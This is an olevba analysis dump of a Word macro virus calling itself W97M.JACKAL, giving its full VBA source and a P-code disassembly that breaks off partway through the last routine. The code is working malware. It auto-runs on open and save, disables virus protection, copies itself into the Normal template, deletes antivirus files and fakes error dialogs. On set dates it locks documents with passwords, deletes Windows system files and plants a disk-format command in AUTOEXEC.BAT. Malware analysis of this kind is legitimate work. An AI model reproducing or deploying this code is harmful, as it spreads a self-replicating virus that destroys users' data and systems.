olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Killer
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Killer - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jackal.bas 
in file: Virus.MSWord.Killer - OLE stream: 'Macros/VBA/Jackal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  On Error GoTo Jackal

  ULTRAS

  KillAV

  Jackal

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "Jackal" Then
      GlobalInstalled = Yes
    End If
  Next

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Jackal" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm", Object:=wdOrganizerObjectProjectItems
    ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If

  Application.DisplayAlerts = wdAlertsAll

Jackal:
End Sub


Sub FileSaveAs()

  Dialogs(wdDialogFileSaveAs).Show

  On Error GoTo Jackal

  Jackal

  ULTRAS

  KillAV

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "Jackal" Then
      GlobalInstalled = Yes
    End If
  Next

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Jackal" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm", Object:=wdOrganizerObjectProjectItems
    ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If

  Application.DisplayAlerts = wdAlertsAll

 Jackal

Jackal:
End Sub

Sub KillAV()
  On Error GoTo Jackal
  Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
  Kill "C:\Program Files\Command Software\F-PROT95\*.dll"
  Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
  Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
  Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
  Kill "C:\Program Files\Symantec\Symevnt.386"
  Kill "C:\Program Files\FindVirus\Findviru.drv"
  Kill "C:\Program Files\Cheyenne\AntiVirus\*.dll"
  Kill "C:\PC-Cillin 95\Lpt$vpn.*"
  Kill "C:\PC-Cillin 95\Scan32.dll"
  Kill "C:\PC-Cillin 97\Lpt$vpn.*"
  Kill "C:\PC-Cillin 97\Scan32.dll"
  Kill "C:\eSafe\Protect\*.dll"
  Kill "C:\f-macro\f-macro.exe"
  Kill "C:\TBAVW95\Tbscan.sig"
  Kill "C:\Tbavw95\Tb*.*"
  Kill "C:\VS95\*.dll"
  Kill "C:\Vdoc\*.*"
Jackal:
End Sub

Sub Format()
  On Error GoTo Jackal
  Beep
Msgbox "Error at openings of the document.", vbCritical + vbOKOnly + vbDefaultButton1, "Microsoft Word"
  Assistant.Visible = True
  With Assistant.NewBalloon
  .Text = "Error, is necessary will update files"
  .Heading = "Microsoft Office 97"
  .Animation = msoAnimationEmptyTrash
  .Show
End With
  Open "C:\AUTOEXEC.BAT" For Input As #1
   Close
   SetAttr "C:\AUTOEXEC.BAT", vbNormal
   Open "C:\AUTOEXEC.BAT" For Append As #1
   Print #1, "@ECHO OFF"
   Print #1, "CLS"
   Print #1, "ECHO Microsoft Corp. 1983-1997 All rights reserved"
   Print #1, "ECHO Goes preparation to renovation of your system files"
   Print #1, "ECHO Please wait this can occupy several minutes"
   Print #1, "FORMAT C: /U /C /S /AUTOTEST > NUL"
   Print #1, "ECHO."
   Print #1, "ECHO."
   Print #1, "ECHO."
   Print #1, "ECHO Error at renovations of files"
   Close #1
  SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
Jackal:
End Sub

Sub ToolsMacro()
Beep
Msgbox "Impossible open this function", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Error"
End Sub

Sub ViewVBCode()
Beep
Msgbox "Function does not answer system requests" & vbCrLf & "", vbExclamation + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Visual Basic"
End Sub

Sub FileTemplates()
UserForm.Show
End Sub

Sub EditFind()
UserForm.Show
Dialogs(wdDialogEditFind).Show
End Sub

Sub HelpAbout()
UserForm.Show
End Sub

Sub ToolsCustomize()
UserForm.Show
Dialogs(wdDialogToolsCustomize).Show
End Sub

Sub ToolsOptions()
UserForm.Show
Dialogs(wdDialogToolsOptions).Show
End Sub

Sub Jackal()
  On Error GoTo Jackal

   If Day(Now()) = 1 Then
      ActiveDocument.Password = "JACKAL"
      ActiveDocument.Save
    End If

   If Day(Now()) = 5 Then
      Format
    End If

   If Day(Now()) = 9 Then
      Format
    End If

   If Day(Now()) = 15 Then
     Kill "C:\*.*"
     Kill "C:\Windows\*.*"
     Kill "C:\Windows\System\*.*"
    End If

   If Day(Now()) = 17 Then
      Format
    End If

   If Day(Now()) = 25 Then
      Format
    End If

   If Day(Now()) = 27 Then
      ActiveDocument.Password = "ULTRAS"
      ActiveDocument.Save
    End If

   If Day(Now()) = 30 Then
     Kill "C:\*.*"
     Kill "C:\Windows\*.*"
     Kill "C:\Windows\System\*.*"
    End If

   If Month(Now()) = 5 Then
      Format
    End If

Jackal:
End Sub

Sub ULTRAS()
  On Error GoTo Jackal
  Application.StatusBar = True
  StatusBar = "W97M.JACKAL by ULTRAS"
  Application.Caption = "ULTRAS"
  Application.UserName = "ULTRAS"
  Application.UserInitials = "JACKAL"
  Options.BackgroundSave = False
  Options.CreateBackup = False
  Options.SendMailAttach = True
Jackal:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm.frm 
in file: Virus.MSWord.Killer - OLE stream: 'Macros/VBA/UserForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Killer
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Jackal - 11342 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError Jackal 
' Line #2:
' Line #3:
' 	ArgsCall ULTRAS 0x0000 
' Line #4:
' Line #5:
' 	ArgsCall KillAV 0x0000 
' Line #6:
' Line #7:
' 	ArgsCall Jackal 0x0000 
' Line #8:
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #10:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #11:
' Line #12:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' Line #15:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #16:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #17:
' Line #18:
' 	Ld No 
' 	St GlobalInstalled 
' Line #19:
' 	Ld No 
' 	St DocumentInstalled 
' Line #20:
' Line #21:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Jackal"
' 	Eq 
' 	IfBlock 
' Line #23:
' 	Ld Yes 
' 	St GlobalInstalled 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Next 
' Line #26:
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #28:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Jackal"
' 	Eq 
' 	IfBlock 
' Line #29:
' 	Ld Yes 
' 	St DocumentInstalled 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Next 
' Line #32:
' Line #33:
' 	Ld GlobalInstalled 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Jackal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "UserForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld DocumentInstalled 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #40:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Jackal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "UserForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #43:
' 	EndIfBlock 
' Line #44:
' Line #45:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #46:
' Line #47:
' 	Label Jackal 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' Line #51:
' 	FuncDefn (Sub FileSaveAs())
' Line #52:
' Line #53:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #54:
' Line #55:
' 	OnError Jackal 
' Line #56:
' Line #57:
' 	ArgsCall Jackal 0x0000 
' Line #58:
' Line #59:
' 	ArgsCall ULTRAS 0x0000 
' Line #60:
' Line #61:
' 	ArgsCall KillAV 0x0000 
' Line #62:
' Line #63:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #64:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #65:
' Line #66:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #68:
' Line #69:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #70:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #71:
' Line #72:
' 	Ld No 
' 	St GlobalInstalled 
' Line #73:
' 	Ld No 
' 	St DocumentInstalled 
' Line #74:
' Line #75:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #76:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Jackal"
' 	Eq 
' 	IfBlock 
' Line #77:
' 	Ld Yes 
' 	St GlobalInstalled 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	StartForVariable 
' 	Next 
' Line #80:
' Line #81:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #82:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Jackal"
' 	Eq 
' 	IfBlock 
' Line #83:
' 	Ld Yes 
' 	St DocumentInstalled 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	StartForVariable 
' 	Next 
' Line #86:
' Line #87:
' 	Ld GlobalInstalled 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #88:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Jackal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #89:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "UserForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #90:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #91:
' 	EndIfBlock 
' Line #92:
' Line #93:
' 	Ld DocumentInstalled 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #94:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Jackal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #95:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "UserForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #96:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #100:
' Line #101:
' 	ArgsCall Jackal 0x0000 
' Line #102:
' Line #103:
' 	Label Jackal 
' Line #104:
' 	EndSub 
' Line #105:
' Line #106:
' 	FuncDefn (Sub KillAV())
' Line #107:
' 	OnError Jackal 
' Line #108:
' 	LitStr 0x002C "C:\Program Files\AntiViral Toolkit Pro\*.avc"
' 	ArgsCall Kill 0x0001 
' Line #109:
' 	LitStr 0x0030 "C:\Program Files\Command Software\F-PROT95\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #110:
' 	LitStr 0x002C "C:\Program Files\McAfee\VirusScan95\Scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #111:
' 	LitStr 0x002A "C:\Program Files\McAfee\VirusScan\Scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #112:
' 	LitStr 0x002E "C:\Program Files\Norton AntiVirus\Viruscan.dat"
' 	ArgsCall Kill 0x0001 
' Line #113:
' 	LitStr 0x0025 "C:\Program Files\Symantec\Symevnt.386"
' 	ArgsCall Kill 0x0001 
' Line #114:
' 	LitStr 0x0027 "C:\Program Files\FindVirus\Findviru.drv"
' 	ArgsCall Kill 0x0001 
' Line #115:
' 	LitStr 0x0029 "C:\Program Files\Cheyenne\AntiVirus\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #116:
' 	LitStr 0x0019 "C:\PC-Cillin 95\Lpt$vpn.*"
' 	ArgsCall Kill 0x0001 
' Line #117:
' 	LitStr 0x001A "C:\PC-Cillin 95\Scan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #118:
' 	LitStr 0x0019 "C:\PC-Cillin 97\Lpt$vpn.*"
' 	ArgsCall Kill 0x0001 
' Line #119:
' 	LitStr 0x001A "C:\PC-Cillin 97\Scan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #120:
' 	LitStr 0x0016 "C:\eSafe\Protect\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #121:
' 	LitStr 0x0016 "C:\f-macro\f-macro.exe"
' 	ArgsCall Kill 0x0001 
' Line #122:
' 	LitStr 0x0015 "C:\TBAVW95\Tbscan.sig"
' 	ArgsCall Kill 0x0001 
' Line #123:
' 	LitStr 0x0010 "C:\Tbavw95\Tb*.*"
' 	ArgsCall Kill 0x0001 
' Line #124:
' 	LitStr 0x000D "C:\VS95\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #125:
' 	LitStr 0x000B "C:\Vdoc\*.*"
' 	ArgsCall Kill 0x0001 
' Line #126:
' 	Label Jackal 
' Line #127:
' 	EndSub 
' Line #128:
' Line #129:
' 	FuncDefn (Sub Format$())
' Line #130:
' 	OnError Jackal 
' Line #131:
' 	ArgsCall Beep 0x0000 
' Line #132:
' 	LitStr 0x0022 "Error at openings of the document."
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbDefaultButton1 
' 	Add 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall Msgbox 0x0003 
' Line #133:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #134:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #135:
' 	LitStr 0x0025 "Error, is necessary will update files"
' 	MemStWith Then 
' Line #136:
' 	LitStr 0x0013 "Microsoft Office 97"
' 	MemStWith Heading 
' Line #137:
' 	Ld msoAnimationEmptyTrash 
' 	MemStWith Animation 
' Line #138:
' 	ArgsMemCallWith Show 0x0000 
' Line #139:
' 	EndWith 
' Line #140:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #141:
' 	CloseAll 
' Line #142:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #143:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "ECHO Microsoft Corp. 1983-1997 All rights reserved"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "ECHO Goes preparation to renovation of your system files"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "ECHO Please wait this can occupy several minutes"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "FORMAT C: /U /C /S /AUTOTEST > NUL"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ECHO."
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ECHO."
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ECHO."
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "ECHO Error at renovations of files"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #155:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #156:
' 	Label Jackal 
' Line #157:
' 	EndSub 
' Line #158:
' Line #159:
' 	FuncDefn (Sub ToolsMacro())
' Line #160:
' 	ArgsCall Beep 0x0000 
' Line #161:
' 	LitStr 0x001D "Impossible open this function"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbMsgBoxHelpButton 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x0005 "Error"
' 	ArgsCall Msgbox 0x0003 
' Line #162:
' 	EndSub 
' Line #163:
' Line #164:
' 	FuncDefn (Sub ViewVBCode())
' Line #165:
' 	ArgsCall Beep 0x0000 
' Line #166:
' 	LitStr 0x0028 "Function does not answer system requests"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbMsgBoxHelpButton 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x0016 "Microsoft Visual Basic"
' 	ArgsCall Msgbox 0x0003 
' Line #167:
' 	EndSub 
' Line #168:
' Line #169:
' 	FuncDefn (Sub FileTemplates())
' Line #170:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #171:
' 	EndSub 
' Line #172:
' Line #173:
' 	FuncDefn (Sub EditFind())
' Line #174:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #175:
' 	Ld wdDialogEditFind 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #176:
' 	EndSub 
' Line #177:
' Line #178:
' 	FuncDefn (Sub HelpAbout())
' Line #179:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #180:
' 	EndSub 
' Line #181:
' Line #182:
' 	FuncDefn (Sub ToolsCustomize())
' Line #183:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #184:
' 	Ld wdDialogToolsCustomize 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #185:
' 	EndSub 
' Line #186:
' Line #187:
' 	FuncDefn (Sub ToolsOptions())
' Line #188:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #189:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #190:
' 	EndSub 
' Line #191:
' Line #192:
' 	FuncDefn (Sub Jackal())
' Line #193:
' 	OnError Jackal 
' Line #194:
' Line #195:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #196:
' 	LitStr 0x0006 "JACKAL"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #197:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #198:
' 	EndIfBlock 
' Line #199:
' Line #200:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #201:
' 	ArgsCall Format$ 0x0000 
' Line #202:
' 	EndIfBlock 
' Line #203:
' Line #204:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #205:
' 	ArgsCall Format$ 0x0000 
' Line #206:
' 	EndIfBlock 
' Line #207:
' Line #208:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #209:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #210:
' 	LitStr 0x000E "C:\Windows\*.*"
' 	ArgsCall Kill 0x0001 
' Line #211:
' 	LitStr 0x0015 "C:\Windows\System\*.*"
' 	ArgsCall Kill 0x0001 
' Line #212:
' 	EndIfBlock 
' Line #213:
' Line #214:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	IfBlock 
' Line #215:
' 	ArgsCall Format$ 0x0000 
' Line #216:
' 	EndIfBlock 
' Line #217:
' Line #218:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	IfBlock 
' Line #219:
' 	ArgsCall Format$ 0x0000 
' Line #220:
' 	EndIfBlock 
' Line #221:
' Line #222:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	IfBlock 
' Line #223:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #224:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #225:
' 	EndIfBlock 
' Line #226:
' Line #227:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	IfBlock 
' Line #228:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #229:
' 	LitStr 0x000E "C:\Windows\*.*"
' 	ArgsCall Kill 0x0001 
' Line #230:
' 	LitStr 0x0015 "C:\Windows\System\*.*"
' 	ArgsCall Kill 0x0001 
' Line #231:
' 	EndIfBlock 
' Line #232:
' Line #233:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #234:
' 	ArgsCall Format$ 0x0000 
' Line #235:
' 	EndIfBlock 
' Line #236:
' Line #237:
' 	Label Jackal 
' Line #238:
' 	EndSub 
' Line #239:
' Line #240:
' 	FuncDefn (Sub ULTRAS())
' Line #241:
' 	OnError Jackal 
' Line #242:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt StatusBar 
' Line #243:
' 	LitStr 0x0015 "W97M.JACKAL by ULTRAS"
' 	St StatusBar 
' Line #244:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld Application 
' 	MemSt Caption 
' Line #245:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld Application 
' 	MemSt UserName 
' Line #246:
' 	LitStr 0x0006 "JACKAL"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #247:
